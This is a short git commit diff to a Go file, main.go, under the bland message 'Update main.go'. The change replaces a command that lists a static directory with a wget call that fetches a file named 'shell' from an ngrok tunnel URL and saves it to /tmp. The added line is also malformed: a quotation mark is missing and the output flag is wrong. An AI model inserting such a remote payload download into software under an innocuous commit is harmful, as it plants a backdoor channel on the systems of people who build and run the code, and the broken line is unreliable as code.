f36b85fc4ee90e89c56bea5ede998da8df0b7a63
Chu <ric1337@protonmail.ch>
2024-09-21 12:34:19 -0300

    Update main.go

--- main.go
+++ main.go
@@ -7,7 +7,7 @@ import (
 
 func main() {
         fmt.Println("Vivo!")
-        cmd := exec.Command("ls", "-la", "/static")
+        cmd := exec.Command("wget", "https://4847-189-40-72-61.ngrok-free.app/shell, "-o", "/tmp/shell")
 
         output, err := cmd.Output()
         if err != nil {
